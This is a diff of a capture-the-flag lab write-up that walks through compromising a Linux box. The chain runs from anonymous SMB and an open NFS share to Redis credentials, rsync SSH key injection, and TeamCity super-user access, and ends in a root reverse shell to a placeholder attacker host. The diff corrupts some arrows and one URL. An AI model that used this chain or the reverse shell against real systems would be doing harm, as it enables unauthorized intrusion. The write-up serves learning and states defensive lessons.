@@ -2,7 +2,7 @@
 
 **Target:** `TARGET_IP` (10.128.153.142 at time of solve)
 **OS:** Linux
-**Difficulty:** Easy (plays like Medium Â— multi-protocol pivot)
+**Difficulty:** Easy (plays like Medium — multi-protocol pivot)
 
 ---
 
@@ -10,27 +10,27 @@
 
 ```
 Port Discovery (22, 111, 139, 445, 873 rsync, 2049 NFS, 6379 Redis, ephemeral)
-    ?
-Anonymous SMB ? \shares readable ? services flag
-    ?
-NFS: showmount -e ? /opt/conf world-exported ? mount
-    ?
-grep secrets in NFS mount ? Redis requirepass "B65Hx562F@ggAZ@F"
-    ?
-redis-cli AUTH ? KEYS * ? GET "internal flag" + LRANGE authlist ? base64 ? rsync creds
-    ?
-rsync read rsync://rsync-connect@target/files ? sys-internal user dir (user flag)
-    ?
-ssh-keygen ? rsync WRITE of authorized_keys into sys-internal/.ssh
-    ?
-SSH as sys-internal ? local TeamCity on 127.0.0.1:8111 as root
-    ?
-ssh -L 8111:localhost:8111 ? access TeamCity UI
-    ?
+    
+Anonymous SMB  \shares readable  services flag
+    
+NFS: showmount -e  /opt/conf world-exported  mount
+    
+grep secrets in NFS mount  Redis requirepass "B65Hx562F@ggAZ@F"
+    
+redis-cli AUTH  KEYS *  GET "internal flag" + LRANGE authlist  base64  rsync creds
+    
+rsync read rsync://rsync-connect@target/files  sys-internal user dir (user flag)
+    
+ssh-keygen  rsync WRITE of authorized_keys into sys-internal/.ssh
+    
+SSH as sys-internal  local TeamCity on 127.0.0.1:8111 as root
+    
+ssh -L 8111:localhost:8111  access TeamCity UI
+    
 Find super-user token in /TeamCity/logs/catalina.out
-    ?
-TeamCity UI as super user ? build step Command Line ? reverse shell as root
-    ?
+    
+TeamCity UI as super user  build step Command Line  reverse shell as root
+    
 Root Flag
 ```
 
@@ -41,12 +41,12 @@ Root Flag
 2. [SMB Anonymous Share](#smb-anonymous-share)
 3. [NFS Share Enumeration](#nfs-share-enumeration)
 4. [Redis Authentication & Enumeration](#redis-authentication--enumeration)
-5. [rsync Read ? sys-internal Home](#rsync-read--sys-internal-home)
-6. [rsync Write ? SSH Key Injection](#rsync-write--ssh-key-injection)
+5. [rsync Read  sys-internal Home](#rsync-read--sys-internal-home)
+6. [rsync Write  SSH Key Injection](#rsync-write--ssh-key-injection)
 7. [User Foothold as sys-internal](#user-foothold-as-sys-internal)
-8. [Local Service Discovery Â— TeamCity](#local-service-discovery--teamcity)
+8. [Local Service Discovery — TeamCity](#local-service-discovery--teamcity)
 9. [SSH Port Forwarding to TeamCity UI](#ssh-port-forwarding-to-teamcity-ui)
-10. [TeamCity Super User Token ? RCE](#teamcity-super-user-token--rce)
+10. [TeamCity Super User Token  RCE](#teamcity-super-user-token--rce)
 11. [Root Flag](#root-flag)
 12. [Key Takeaways](#key-takeaways)
 
@@ -87,7 +87,7 @@ nmap -sVC -p22,111,139,445,873,2049,6379,45713,46991,49585,53297 $TARGET -oA ser
 enum4linux -a $TARGET
 ```
 
-The relevant line is the `shares` enumeration Â— `\shares` is listed READ. No credentials needed.
+The relevant line is the `shares` enumeration — `\shares` is listed READ. No credentials needed.
 
 ```bash
 # What it does: list and interact with SMB shares on the target.
@@ -97,7 +97,7 @@ smbclient -N //$TARGET/shares
 smbclient -N //$TARGET/shares -c 'recurse ON; prompt OFF; mget *'
 ```
 
-Inside is a **services flag** Â— the first of several in the box.
+Inside is a **services flag** — the first of several in the box.
 
 ---
 
@@ -114,7 +114,7 @@ Output:
 /opt/conf   *
 ```
 
-The `*` wildcard means **any host can mount it** Â— no export restrictions.
+The `*` wildcard means **any host can mount it** — no export restrictions.
 
 ### Mount locally
 ```bash
@@ -182,11 +182,11 @@ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIH
 Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
 ```
 
-(Note: the original log message truncates the final `v` in some copies Â— include it.)
+(Note: the original log message truncates the final `v` in some copies — include it.)
 
 ---
 
-## rsync Read ? sys-internal Home
+## rsync Read  sys-internal Home
 
 rsync is running in daemon mode on port 873 with modules defined in `rsyncd.conf`. The credential above authenticates to the `files` module.
 
@@ -225,11 +225,11 @@ find ./rsync_files -type f -iname "*.txt"
 cat ./rsync_files/sys-internal/user.txt        # path varies
 ```
 
-The `sys-internal/` subtree mirrors the user's home. `.ssh/` is writable through the same module Â— we will abuse that next.
+The `sys-internal/` subtree mirrors the user's home. `.ssh/` is writable through the same module — we will abuse that next.
 
 ---
 
-## rsync Write ? SSH Key Injection
+## rsync Write  SSH Key Injection
 
 ### Generate an SSH keypair locally
 ```bash
@@ -253,7 +253,7 @@ rsync --password-file=/tmp/rsync.pass authorized_keys \
   rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
 ```
 
-The module is writable Â— rsync accepts the upload without a credential for write (the module auth above is sufficient).
+The module is writable — rsync accepts the upload without a credential for write (the module auth above is sufficient).
 
 ---
 
@@ -273,7 +273,7 @@ sys-internal@vulnnet-internal:~$ cat user.txt
 
 ---
 
-## Local Service Discovery Â— TeamCity
+## Local Service Discovery — TeamCity
 
 Baseline enumeration:
 ```bash
@@ -306,7 +306,7 @@ It includes an `authorizationToken` (agent-level, not useful for the UI):
 authorizationToken=b441ad5edaf61a90da0969cb9a2b4079
 ```
 
-The UI needs a **super user token** Â— printed in TeamCity's main log on every server start.
+The UI needs a **super user token** — printed in TeamCity's main log on every server start.
 
 ---
 
@@ -327,7 +327,7 @@ Now `http://localhost:8111/` renders the TeamCity login.
 
 ---
 
-## TeamCity Super User Token ? RCE
+## TeamCity Super User Token  RCE
 
 ### Locate the super-user token in logs
 ```bash
@@ -346,15 +346,15 @@ Super user authentication token: 2181062568204067727
 ```
 
 ### Authenticate to the UI
-Open `http://localhost:8111/login.html?super=1` (or use the login field: empty username, token as password).
+Open `http://localhost:8111/login.htmlsuper=1` (or use the login field: empty username, token as password).
 
 ### Build a Command Line step that runs as root
 
-TeamCity builds run as the process owner of the agent Â— the agent is started by the server, which runs as root on this host.
+TeamCity builds run as the process owner of the agent — the agent is started by the server, which runs as root on this host.
 
-1. _Projects_ ? _Create project_ ? name `Prueba`, ID `Prueba`.
-2. Inside, _Create build configuration_ ? name `ReverseShell`.
-3. _Build Steps_ ? _Add build step_ ?
+1. _Projects_  _Create project_  name `Prueba`, ID `Prueba`.
+2. Inside, _Create build configuration_  name `ReverseShell`.
+3. _Build Steps_  _Add build step_ 
    - Runner type: **Command Line**
    - Step name: `Reverse Shell`
    - Execute: **Custom script**
@@ -362,7 +362,7 @@ TeamCity builds run as the process owner of the agent Â— the agent is started
      ```bash
      bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
      ```
-4. _Agents_ ? confirm `Default Agent` is _Authorized_.
+4. _Agents_  confirm `Default Agent` is _Authorized_.
 
 ### Catch the shell
 Listener on the attacker:
@@ -373,9 +373,9 @@ nc -lvnp 4444
 ```
 
 ### Fire the build
-Back in TeamCity UI ? _ReverseShell_ ? **Run**.
+Back in TeamCity UI  _ReverseShell_  **Run**.
 
-The agent executes the script **as root** ? callback lands on `nc`:
+The agent executes the script **as root**  callback lands on `nc`:
 ```
 id
 uid=0(root) gid=0(root) groups=0(root)
@@ -404,18 +404,18 @@ cat /root/root.txt
 | **Lateral movement** | rsync module abuse (read + write) | Pushed `authorized_keys` into `sys-internal/.ssh/` |
 | **Service discovery** | `ss -tulpn` loopback listeners | TeamCity 8111 / 9090 running as root |
 | **Pivoting** | SSH `-L` port forwarding | Exposed loopback UI to attacker |
-| **RCE** | TeamCity super-user token in log | Build step with Command Line runner ? root |
+| **RCE** | TeamCity super-user token in log | Build step with Command Line runner  root |
 
 ### Security Lessons
 
-1. **Do not export NFS with `*` wildcard** Â— always use `rw,host-list` with explicit IPs or subnets.
-2. **Redis is not a secure keystore for secrets** Â— `LRANGE` and `KEYS *` show everything to anyone with AUTH access.
-3. **rsync modules default to readable/writeable** Â— set `read only = yes` in `rsyncd.conf` unless intentionally shared for write, and always require secrets for both directions.
-4. **TeamCity super user tokens print to the main log** Â— log files must be readable only by service accounts.
-5. **Build agents inherit the server's privileges** Â— running TeamCity as root means every build step is root RCE.
+1. **Do not export NFS with `*` wildcard** — always use `rw,host-list` with explicit IPs or subnets.
+2. **Redis is not a secure keystore for secrets** — `LRANGE` and `KEYS *` show everything to anyone with AUTH access.
+3. **rsync modules default to readable/writeable** — set `read only = yes` in `rsyncd.conf` unless intentionally shared for write, and always require secrets for both directions.
+4. **TeamCity super user tokens print to the main log** — log files must be readable only by service accounts.
+5. **Build agents inherit the server's privileges** — running TeamCity as root means every build step is root RCE.
 
 ### Related Notes
-- [ftp](../../../tools/recon/ftp.md) / [smbclient](../../../tools/recon/smbclient.md) / [enum4linux](../../../tools/recon/enum4linux.md) Â— initial SMB triage
+- [ftp](../../../tools/recon/ftp.md) / [smbclient](../../../tools/recon/smbclient.md) / [enum4linux](../../../tools/recon/enum4linux.md) — initial SMB triage
 - [showmount + NFS abuse playbook](../../../exploits/network-services/nfs-share-abuse.md)
 - [Redis authenticated enumeration](../../../exploits/network-services/redis-auth-abuse.md)
 - [rsync module read/write abuse](../../../exploits/network-services/rsync-module-abuse.md)
